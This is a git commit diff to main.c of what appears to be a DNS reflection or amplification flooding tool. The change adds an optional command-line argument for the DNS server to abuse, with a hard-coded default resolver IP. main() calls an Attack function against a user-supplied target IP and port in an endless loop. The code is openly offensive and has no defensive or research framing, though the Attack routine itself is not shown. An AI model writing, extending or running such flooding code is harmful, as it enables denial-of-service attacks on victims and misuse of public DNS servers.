56b33b10fcb27a37e008105e25ee3c373d061b72
Reilly Moore <yllierm519@gmail.com>
2015-12-07 16:35:02 -0500

    Added command line option to set dns server

--- main.c
+++ main.c
@@ -10,16 +10,22 @@ int main(int argc, char **argv){
 	if(argc < 3){
 		printf("Wrong number of options \n"
 		 	   "Example \n"
-		 	   "  dns [targetip] [targetport]\n\n");
+		 	   "  dns targetip targetport [dnsip]\n\n");
 
 		return -1;
 	}
 
 	char *targetip = argv[1];
 	int targetport = atoi(argv[2]);
+	char *dnsip;
+
+	if(argc == 4)
+		dnsip = argv[3];
+	else
+		dnsip = "208.80.184.69";
 
 	while(1){
-		Attack(targetip, targetport, "208.80.184.69", 53, "ietf.org");
+		Attack(targetip, targetport, dnsip, 53, "ietf.org");
 	}
 
 	return 0;
